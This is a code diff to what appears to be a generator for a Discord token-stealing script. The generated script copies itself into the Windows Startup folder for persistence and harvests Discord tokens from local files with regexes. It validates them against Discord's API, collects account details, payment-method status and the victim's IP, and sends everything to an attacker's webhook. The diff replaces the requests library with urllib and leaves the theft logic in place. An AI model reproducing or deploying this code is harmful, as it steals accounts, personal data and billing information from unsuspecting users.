@@ -8,18 +8,18 @@ def mkdata(webhook: str, ping: bool) -> str:
 
 
 
-from genericpath import isfile
-from requests import get, post
+from urllib.request import urlopen, Request
+from urllib.error import HTTPError
 from os import getenv, listdir, startfile
-from os.path import isdir
+from os.path import isdir, isfile
 from re import findall
 
-from json import dumps
+from json import loads, dumps
 from shutil import copy
 
 
 
-path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/riot.pyw" % getenv("userprofile")
+path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/riot.py" % getenv("userprofile")
 
 
 if not isfile(path):
@@ -30,15 +30,17 @@ elif __file__.replace('\\', '/') != path.replace('\\', '/'):
     exit()
 
 
-
-webhook = '""" + webhook + r"""'
-pingme = """ + ping + r"""
+webhook = '""" + webhook + """'
+pingme = """ + str(ping) + """
 
 
 class Discord:
 
-    def setheaders(token: str) -> dict:
-        return {"Authorization": token}
+    def setheaders(token: str = None) -> dict:
+        headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
+        if token:
+            headers['authorization'] = token
+        return headers
 
     def get_tokens() -> list:
         tokens = []
@@ -64,14 +66,13 @@ class Discord:
                     for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                         for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                             for token in findall(regex, line):
-                                if (
-                                    get(
+                                try: 
+                                    urlopen(Request(
                                         "https://discord.com/api/v9/users/@me",
-                                        headers=Discord.setheaders(token),
-                                    ).status_code == 200
-                                    and token not in found_tokens
-                                    and token not in tokens
-                                ):
+                                        headers=Discord.setheaders(token)))
+                                except HTTPError:
+                                    continue
+                                if token not in found_tokens and token not in tokens:
                                     found_tokens.append(token)
 
             return found_tokens
@@ -86,15 +87,17 @@ class Grab:
     def token_grab(token: str):
         def getavatar(uid, aid) -> str:
             url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
-            if get(url).status_code != 200:
+            try:
+                urlopen(Request(url, headers=Discord.setheaders()))
+            except HTTPError:
                 url += ".gif"
             return url
 
         def has_payment_methods(token) -> bool:
             has = False
             try:
-                has = bool(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
-                           headers=Discord.setheaders(token)).json())
+                has = bool(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+                           headers=Discord.setheaders(token))).read()))
             except:
                 pass
             return has
@@ -104,9 +107,9 @@ class Grab:
         def verify(var):
             return valid if var else invalid
 
-        user_data = get("https://discordapp.com/api/v6/users/@me",
-                        headers=Discord.setheaders(token)).json()
-        ip = get('http://ipinfo.io/json').json()['ip']
+        user_data = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",
+                        headers=Discord.setheaders(token))).read())
+        ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
         computer_username = getenv("username")
         username = user_data["username"] + \
             "#" + str(user_data["discriminator"])
@@ -178,7 +181,7 @@ class Grab:
                 "avatar_url": "https://repository-images.githubusercontent.com/414716027/e3031476-fa45-48e0-8d08-f2c621d5a588",
                 "embeds": data,
                 "content": "@everyone" if pingme else ""}
-        return post(webhook, data=dumps(data), headers={"content-type":"application/json"})
+        return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))
 
 
 sent_tokens = []
@@ -222,7 +225,6 @@ while True:
     if not isfile(__file__):
         exit()
     token_grab()
-
 """
 
 
